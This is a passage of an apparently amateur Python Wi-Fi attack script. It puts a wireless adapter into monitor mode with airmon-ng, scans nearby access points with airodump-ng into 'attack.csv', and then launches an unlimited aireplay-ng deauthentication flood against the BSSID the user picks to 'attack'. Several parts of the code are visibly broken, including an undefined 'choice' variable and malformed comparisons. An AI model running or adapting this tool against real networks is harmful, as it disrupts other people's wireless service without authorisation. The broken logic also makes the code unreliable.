            print('String Nic,', nic)
            print('X' * 50)
            print(), print()
            time.sleep(3)

    # except EOFError as EOF:
    #     traceback.print_exc()
    #     print(str(EOF))
    #     print(f'{red}**Error, must have input{reset}')

    except Exception as e:
        traceback.print_exc()
        print(str(e))
        sys.exit(1)

## ################################################################ ##
## ################################################################ ##
## ################################################################ ##


try:
    interface_gateway = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    print(f'{yellow}**Available IPs{reset}')#\n{default_gateway}')
    #    print(type(default_gateway))

    subprocess.check_output("ifconfig en0 | awk '{ print $2}' | grep -E -o '([0-9]{1,3}[\.]){3}[0-9]{1,3}'", shell=True) ## change shel=True later    #  default_gateway = interface_gateway.findall(subprocess.run(['iwconfig'], capture_output=True, text=True)#.stdout.decode())
except Exception as f:
    traceback.print_exc()
    print(f'{red} --[ERROR IN INTERACE GATEWAY]--{reset}\n{str(f)}')


try:
    print(f'{red}The sys details are saved in cwd')
    print(f'{bblue}[1]-Install Required Packages\n[2]- Connect Vpn \n[3]Available Nics (PCI or USB) \n -NIC-Status [4]\n[5]-Nic-Details(Verbose')
    print(f'{bblue}[6]-Radio-Status\n[7]-NIC-Permissions\n[8]-WIFI-SCAN \n[9]-ArpScan\n[10]-Local Port Listener\n[11]-Available Networks')

    info00 = CheckInfo()
    while True:
        nic_choice = input()
        if int(nic_choice) >= 12 or int(nic_choice) <= -1 or int(nic_choice) is str:
            print(f'{red}**Invalid Selection{reset}')
            continue
        if nic_choice == 0:
            print(f'{yellow}*User Exit, breaking loop{reset}')
            break
        elif int(nic_choice) == 1:
            try:
                print(f'{yellow}-[Installing Dependancies]{reset}')
                info00.install()
            except Exception as e:
                traceback.print_exc()
                print(f'{red} [Error Installing Dependancies]{reset}')

        elif int(nic_choice) == 2:
            try:
                print(f'{yellow}-[Running-VPN-Services]{reset}')
                info00.connect_vpn()
            except Exception as e:
                print(f'{red} [Error-Starting-VPN-Daemon]{reset}\n{str(e)}')

        elif int(nic_choice) == 3:
            try:
                print(f'{yellow}-[Available NICS]{reset}')
                info00.available_nics()
            except Exception as e:
                traceback.print_exc()

                print(f'{red} [Error with NIC parsing]{reset}\n{str(e)}')

        elif int(nic_choice) == 4:
            try:
                print(f'{yellow}-[NIC-STATUS]{reset}')
                info00.nic_status()
            except Exception as e:
                traceback.print_exc()

                print(f'{red} [Error with NIC parsing]{reset}\n{str(e)}')

        elif int(nic_choice) == 5:
            try:
                print(f'{yellow}-[Parsing Verbose Details on NIC]{reset}')
                info00.interface_info()
            except Exception as e:
                traceback.print_exc()
                print(f'{red} [Error in parsing Verbose NIC Details]{reset}\n{str(e)}')

        elif int(nic_choice) == 6:
            try:
                print(f'{yellow}-[Radio-Status]{reset}')
                info00.radio_status()
            except Exception as e:
                traceback.print_exc()
                print(f'{red} [Error in parsing Verbose NIC Details]{reset}\n{str(e)}')

        elif int(nic_choice) == 7:
            try:
                print(f'{yellow}-[Radio-Status]{reset}')
                info00.get_nic_permissions()
            except Exception as e:
                traceback.print_exc()
                print(f'{red} [Error in parsing Verbose NIC Details]{reset}\n{str(e)}')

        elif int(nic_choice) == 9:
            try:
                print(f'{yellow}-[ARP-SCAN]{reset}')
                ARPscan()
            except Exception as e:
                traceback.print_exc()
                print(f'{red} [Error in parsing Verbose NIC Details]{reset}\n{str(e)}')

        elif int(nic_choice) == 10:
            try:
                print(f'{yellow}-[Poormans NETSTAT]{reset}')
                info00.lame_netstat()
            except Exception as e:
                traceback.print_exc()
                print(f'{red}[ERROR IN PARSING NETSTAT{reset}')

        elif int(nic_choice) == 11:
            try:
                print(f'{yellow}-[Listening For Nearby APs]{reset}')
                info00.find_signals()
            except Exception as e:
                traceback.print_exc()
                print(f'{red} [Error in finding signals {reset}')

except Exception as f:
    traceback.print_exc()
    print(f'{red} --[ERROR PROCESSING SUBPROCESS and NIC REQUESTS.]--{reset}\n{str(f)}')

else:
    try:
        with Spinner():
            global afirm, negat
            afirm = ['Yes', 'yes', 'y']
            negat = ['N', 'NO', 'n', 'no']
            print(f'{yellow} Start [ARP-SCAN] (Y/N)? {reset}')
            arp = input('** ')
            if arp in afirm:
                local_scan = arp_scan()
                print('X' * 50)
                print(f'{yellow}**[ARP-CHECK]--{local_scan}{reset}')
                print(local_scan)
                print('X' * 50)
                print()
                time.sleep(5)
            else:
                pass
    except Exception:
        print(f'{red} --[ERROR IN ARP-SCANNER]-- {reset}')

try:
    with Spinner():
        cwd = os.getcwd()
        for f in os.listdir(cwd):
            if 'attack.csv' in f:
                print('x' * 50)
                current_files = subprocess.run(['ls', '-la'], capture_output=True, text=True)  ## .stdout.decode())
                #  print(f'[SYSTEM] {current_files}')
                print(f'{yellow} :: Current Files in Directory ::{reset}\n {current_files}')
                # to get current directory
                backup = pathlib.PurePath('/backup/')
                directory = os.getcwd()
                time.sleep(2)
                if backup not in os.walk(directory):
                    try:
                        backup = pathlib.PurePath('/backup/')
                        backup_dir = directory + str(backup)
                        os.mkdir(backup_dir, 777)
                        timestamp = datetime.now()
                        shutil.move(f, directory + "/backup/" + str(timestamp) + '-' + f)
                        print(f'**{yellow}**Created backup file in:{reset} \n[{backup_dir}]')
                        time.sleep(2.5)
                        break
                    except:
                        print(f'{red}**  Folder already exists **{reset}\n[{backup}]')
                        break
                else:
                    print(f'**{red}.csv found in directory. moving it to backup folder. {reset}')
                    time.sleep(2)
                    break
except IOError as e:
    traceback.print_exc()
    print(f'{red}IO ERROR in parsing listdir()): {reset}', e)

############################################################################### ##
############################################################################### ##
## ADD LOGIC TO DETERMIN KALI / UBUNTU USING PLATFORM ##

else:  # final else
    try:  # try except
        time.sleep(3)
        run_discovery = True
        while run_discovery:
            subprocess.call('clear', shell=True)

            signal = True
            for file_name in os.listdir(cwd):
                if signal is False:
                    break
                while signal:  # check for old .csv. check for backup folder. create back up folder. move old .csv
                    if 'attack.csv' in file_name:
                        print(f'{yellow}**Found old attack.csv in{reset}\n {cwd}')
                        print(f'{yellow}*moving to backup folder.. {reset}')
                        time.sleep(1)
                        backup_time = datetime.now()
                        backup_time = str(backup_time)
                        # global backup_loc
                        backup_loc = cwd + '/DOS_BACKUP' + backup_time
                        os.mkdir(backup_loc)
                        if os.path.isdir(backup_loc):
                            print(f'{yellow}**Created Directory For Backup {reset}\n {cwd}')
                            shutil.move(file_name, backup_loc + str(timestamp) + '-' + f)
                            for (root, dirs, files) in os.walk(backup_loc, topdown=True):
                                if os.path.isfile('attack.csv'):
                                    print(
                                        f'{yellow}**Succesfully Moved CSV to backup folder{reset} \n at{red} [TIME]--{backup_time} :: [DIR] {backup_loc} {reset}\n')
                                    time.sleep(3)
                                    signal = False
                                    pass
                    else:
                        current_time = time.time()
                        current_clock = ctime(current_time)
                        directory = os.getcwd()
                        print(f'{red}**Did not find a directory, searching for one.. {reset}')
                        print(f'{yellow}*Refer to {directory} && {cwd} for reference {reset} \n*{current_clock}')
                        file = open('attack.csv', 'w')
                        file.close()
                        break
                        signal = False
                        if os.path.isfile(cwd):
                            print(f'{yellow}**Created attack.csv in:{reset} \n {cwd}')
                            time.sleep(1)
                            file.close()
                            signal = False
                            pass


    except Exception as e:
        traceback.print_exc()
        print(f'{red}**[ERROR]-- In Creating Backup Directory. {reset}\n {e}')
        pass

    finally:
        display_header()
        period_wait()
        print(f'{yellow} :: Your NIC :: {reset}\n {nic}')
        print(f'{yellow} {type(nic)} {reset}'), print()
        print('X' * 50)
        print(f'**{yellow}**Wifi adapter now connected, staring processes.{reset}')
        time.sleep(5)

# except Exception as e:
#     traceback.print_exc()
#     print(f'{red}**[ERROR]-- In Creating Backup Directory. {reset}\n {e}')
#     pass
#

######################################################## ##
######################################################## ##
######################################################## ##
######### START ##############

try:
    with Spinner():
        AIR_MON = True
        while AIR_MON:
            ####### DISPLAY CONFLICTING SUBPROCESSES #########
            display_conflict = subprocess.run(['sudo', 'airmon-ng', 'check'], capture_output=True, text=True)
            if display_conflict:
                print(f'{yellow} :: Conflicting Subprocesses :: {reset}')
                print(display_conflict)
                time.sleep(3)
            else:
                print(f'{red} :: No conflicting subprocesses :: {reset}')

            ############# KILL PROCESS ###################
            kill_process = subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], stdout=PIPE, stdin=PIPE, stderr=PIPE)
            if kill_process:
                print(f'{yellow} :: Killing System Processes ::')
                print(kill_process)
            #  run_discovery = False
            # break
            else:
                print(f'{red}**No subprocess to kill{reset}')

                ########### START MONITOR MODE##################

            print(f'{yellow}**[--INITIATING MONITORED MODE--]{reset}')  # capture_output = True, text = True

            time.sleep(3)
            start = subprocess.run(['sudo', 'airmon-ng', 'start', nic], capture_output=True, text=True)
            if start:
                print(f'**{yellow}**[Successfully Started Airmon-NG]** {reset}')
                time.sleep(.1)
                pprint.pprint(start)
                print(f'{start}')
            else:
                print(f'{red}**[MONITORED-MODE-FAILED]{reset}')

            ######### START SEQUENCE FOR DISCOVER AP #######
            print(f'{yellow}**[--INITIATING DISCOVER_AP SEQUENCEE--]{reset}')
            time.sleep(3)
            discover_ap = subprocess.Popen(
                ['sudo', 'airodump-ng', '-w', 'file', '--write-interval', '1', '--output-format', 'csv',
                 nic + 'mon'], stdout=PIPE, stderr=PIPE, stdin=PIPE)
            if discover_ap:
                print(f'**{yellow}**[DISCOVERED AP]** {reset}')
                time.sleep(.1)

            ##########################################################################
            for root, dirs, file in os.walk(cwd):
                if 'attack.csv' in file or 'attack.csv' in dirs:
                    print(f'{yellow}**Found [attack.csv] in directory, moving on.. ')
                    time.sleep(1)
                    break
                elif "attack.csv" not in file or 'attack.csv' not in dirs:
                    print(f'{red}** Did not file a old .csv , searching for one.. {reset}')
                    csv_loc = cwd + 'attack.csv'
                    file00 = open('attack.csv', 'w')
                    file00.close()
                    if file00 is 'attack.csv':
                        print(f'{yellow}**The .csv is in: {reset} \n*{csv_loc}')
                        time.sleep(2)
                        file00.close()
                        break

            if os.path.isfile('attack.csv'):
                print(f'{yellow}**[--FOUND ATTACK.CSV--]{reset}')
                time.sleep(.5)
                with open('attack.csv') as csv_h:  # in os.listdir(cwd) as csv_h:
                    params = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
                              'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'key']

                    csv_reader = csv.DictReader(csv_h, fieldnames=params)  ## map the key values to params

                    print(f'{yellow} :: LIST PARAMS :: {reset} \n{params}')
                    print(f'{yellow} :: Your NIC :: {reset}\n {nic}')
                    print(f'{yellow} {type(nic)} {reset}'), print()
                    csv_h.seek(0)
                    print(f'{yellow} CSV-H ENUM\n {csv_h}')

                    for index, result in enumerate(nic):
                        print(f'{bblue}{index} || {result}{reset}')
                        # with open('attack.csv') as csv_h:
                        for row in csv_reader:
                            if row['BSSID'] == 'BSSID':  # skip bssid, its already listed.
                                print(f'{yellow} found [BSID] in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
                                ACTIVE_NETWORKS.append(row)
                            elif row in ['BSSID'] == 'Station MAC':  ## GETS RID OF CLIENT DATA.
                                print(
                                    f'{yellow} found [BSID] (MACHINE-MAC) in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
                                ACTIVE_NETWORKS.append(row)
                                break
                            elif check_wifi(row['ESSID'], ACTIVE_NETWORKS):
                                print(f'{yellow} found ESSID in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
                                ACTIVE_NETWORKS.append(row)
                            elif check_wifi(row['SSID'], ACTIVE_NETWORKS):
                                print(f'{yellow} found SSID in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
                                ACTIVE_NETWORKS.append(row)
                            elif check_wifi(row['LAN_IP'], ACTIVE_NETWORKS):
                                print(f'{yellow} found LAN_IP in: {reset}\n {ACTIVE_NETWORKS}\n{row}')
                                ACTIVE_NETWORKS.append(row)

                        print(
                            f'**{yellow}Scanning. Press control+ when you want to select the network you want to attack.{reset}\n')
                        print("No |\tBSSID              |\tChannel|\tESSID                         |")
                        print("___|\t___________________|\t_______|\t______________________________|")
                        print(f'{yellow}**[ACTIVE_NETWORKS]\n{ACTIVE_NETWORKS}')

                    try:
                        for index, item in enumerate(ACTIVE_NETWORKS):
                            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
                            active_network = True
                            # if KeyboardInterrupt:
                            #     print(f'\n{red}[SYSTEM] USER EXIT.{reset}')
                            #     traceback.print_exc()
                            #     active_network = False
                            #     choice = input("[SYSTEM] Please make a choice from above. ")
                            try:
                                if ACTIVE_NETWORKS[int(choice)]:
                                    hack_ssid = ACTIVE_NETWORKS[int(choice)]["BSSID"]
                                    hack_channel = ACTIVE_NETWORKS[int(choice)]["channel"].strip()
                                    subprocess.run(["airmon-ng", "start", nic + "mon", hack_channel])
                                    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hack_ssid,
                                                    AVAILABLE_NICS[int(nic)] + "mon"], stdout=PIPE, stdin=PIPE,
                                                   stderr=PIPE)

                                    # capture_output = True, text = True
                                    time.sleep(1)
                                    continue
                            except Exception as error:
                                traceback.print_exc()
                                print(f'{red}** ERROR IN ACTIVE_NETWORK PARSING \n{str(error)}{reset}')

                    except Exception as error:
                        traceback.print_exc()
                        print(f'{red}**{str(error)}{reset}')

                    except KeyboardInterrupt as Keyboard:  ### keyboard interupt --> disable monitormode
                        print(f'\n{red}[SYSTEM] USER EXIT\n Keyboard.{reset}')
                        traceback.print_exc()
                        pprint.pprint(ACTIVE_NETWORKS)
                        ## DISABLE MONITORED MODE
                        print(f'**{yellow}**[Killing Monitoring Process]** {reset}')
                        disable_monitor = subprocess.run(['sudo', 'airmon-ng', 'stop', nic])
                        if disable_monitor:
                            print(f'{red}**Successfully Killed Monitoring Process{reset}')
                            print(f'{red}*Breaking Loop{reset}')
                            run_discovery = False

except Exception as final_error:
    traceback.print_exc()
    print(f'{red}**{str(final_error)}.{reset}')

#
